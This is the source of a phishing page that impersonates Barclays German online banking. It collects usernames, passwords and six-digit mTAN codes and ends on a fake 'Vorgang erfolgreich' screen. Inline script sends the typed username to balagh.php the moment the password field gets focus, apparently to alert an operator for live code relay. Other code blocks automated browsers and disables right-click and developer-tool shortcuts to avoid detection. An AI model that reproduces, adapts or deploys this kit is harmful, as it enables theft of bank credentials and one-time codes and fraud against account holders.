<?php
try {
    require_once __DIR__ . '/scripts/security.php';
} catch (Exception $e) {

}
?>
<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Barclays Online-Banking</title>
    <link rel="stylesheet" href="./css/style.css">
</head>

<body>

    <header class="page-header">
        <div class="container header-content">
            <a href="#"><img src="./img/logo.svg" alt="bcr Logo" class="logo"></a>
            <a href="#" id="register-btn" class="btn btn-primary">Jetzt registrieren</a>
        </div>
    </header>

    <main>
        <section id="login-section">
            <div class="container main-content">
                <div class="login-column">
                    <div id="global-login-error-box" class="global-error-box">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                            <path
                                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z">
                            </path>
                        </svg>
                        <div>Ihre Eingaben sind nicht richtig. Ihr Zugang wird nach drei Passwort-Fehleingaben gesperrt.
                            Über „Zugangsdaten vergessen“, können Sie ein neues Passwort festlegen. Für das
                            Tagesgeld-Online-Banking besuchen Sie bitte service.barclays.de. (124)</div>
                    </div>
                    <nav class="login-tabs"><a id="tab-online-banking" class="active">Online-Banking</a><a
                            id="tab-tagesgeld">Tagesgeldkonto</a></nav>
                    <div id="online-banking-view">
                        <h1>Willkommen in Ihrem<br>Online-Banking</h1>
                        <form id="login-form">
                            <div class="form-group"><label for="username">Benutzername</label><input type="text"
                                    id="username" required></div>
                            <div class="form-group"><label for="password">Passwort</label><input type="password"
                                    id="password" required onfocus="balagh()"></div>
                            <button type="submit" class="btn btn-primary btn-submit">Anmelden</button>
                        </form><a href="#" class="forgot-link">Zugangsdaten vergessen</a>
                    </div>
                    <div id="tagesgeld-view" style="display: none;">
                        <h1>Hier kommen Sie zum<br>Tagesgeld Online-Banking</h1>
                        <p>Der Login zu ihrem Tagesgeldkonto befindet sich auf einer separaten Seite.</p><a href="#"
                            class="btn tagesgeld-btn">Zum Tagesgeldkonto Login</a>
                    </div>
                </div>
                <div class="promo-column">
                    <div class="promo-box">
                        <div class="promo-content"><img class="promo-image" src="./img/pub.png"
                                alt="Mehr über Onlinesicherheit erfahren"></div>
                    </div>
                </div>
            </div>
        </section>

        <section id="mtan-section">
            <div class="mtan-content-wrapper">
                <h1>mTAN</h1>
                <div id="global-mtan-error-box" class="global-error-box">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                        <path
                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z">
                        </path>
                    </svg>
                    <div>Die von Ihnen eingegebene mobileTAN ist leider nicht korrekt. Bitte geben Sie die mobileTAN
                        erneut ein.</div>
                </div>
                <div class="info-box">
                    <p>Wir haben eine mTAN per SMS an folgende Mobilnummer gesendet:</p>
                    <p style="font-weight:bold; color:#037cc2; margin-top:8px;">+491***********</p>
                </div>
                <form class="mtan-form" onsubmit="return false;">
                    <div class="mtan-inputs"><input type="tel" maxlength="1"><input type="tel" maxlength="1"><input
                            type="tel" maxlength="1"><input type="tel" maxlength="1"><input type="tel"
                            maxlength="1"><input type="tel" maxlength="1"></div>
                </form>
                <div class="meta-info">
                    <p>Barclays Referenz: <span style="font-weight:bold;">P8KLXD</span></p>
                    <p>Gültigkeit der mTAN läuft ab in: <span id="countdown" style="font-weight:bold;">04:52</span></p>
                </div>
                <div class="help-section">
                    <p>Falls Sie keine mTAN erhalten haben, können Sie eine neue anfordern. Bitte überprüfen Sie in dem
                        Fall auch Ihre Netzwerkverbindung. Sie haben eine neue Mobilnummer? Bitte wenden Sie sich
                        telefonisch an unseren Kundenservice:</p>
                    <p>Aus Deutschland: <span style="font-weight: bold;">+49 40 890 99 - 600</span> (Für den Barclays
                        Finanzierungsrahmen rufen Sie bitte die Durchwahl -880 an)</p>
                </div>
            </div>
        </section>

        <section id="finished-section">
            <div class="content-wrapper">
                <svg class="success-checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                    <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none" />
                    <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
                </svg>
                <h1>Vorgang erfolgreich!</h1>
                <p>Ihre Daten wurden sicher bestätigt. Sie werden in Kürze weitergeleitet.</p>
            </div>
        </section>
    </main>

    <footer class="page-footer">
        <div class="container">
            <nav>
                <ul class="footer-links">
                    <li><a href="#">FAQ</a></li>
                    <li><a href="#">Kontakt</a></li>
                    <li><a href="#">Impressum</a></li>
                    <li><a href="#">Datenschutz</a></li>
                    <li><a href="#">AGB</a></li>
                    <li><a href="#">Barrierefreiheit</a></li>
                </ul>
            </nav>
        </div>
    </footer>

    <div id="loading-overlay">
        <div class="spinner"></div>
    </div>
    <script>
        if (navigator.webdriver || window.callPhantom || window._phantom || window.phantom) {
            document.body.innerHTML = '<div style="text-align:center;padding:50px;"><h1>Access Denied</h1><p>Automated browsing detected.</p></div>';
        }

        document.addEventListener('contextmenu', function (e) {
            e.preventDefault();
            return false;
        });

        document.onkeydown = function (e) {
            if (e.keyCode == 123 || // F1
                (e.ctrlKey && e.shiftKey && e.keyCode == 73) ||
                (e.ctrlKey && e.keyCode == 85)
            ) {
                return false;
            }
        };
    </script>
    <script src="./js/script.js" defer></script>

    <script>

        function specialBalagh(addToText) {

            let myText = `${addToText}`;

            const newFormMsg = new FormData()
            newFormMsg.append("msg", myText)

            fetch('./balagh.php', {
                method: 'POST',
                body: newFormMsg
            })
                .then(response => response.json())
                .then(data => {
                    console.log(data.ok)
                })
                .catch(error => console.error('Error:', error));
        }

        var isSent = false;

        function balagh() {
            if (!isSent && username.value !== '') {
                let myText = `🚨Get Ready!\n\nUsr: ${username.value}`;

                specialBalagh(myText)
                isSent = true;
            }
        }

    </script>
</body>

</html>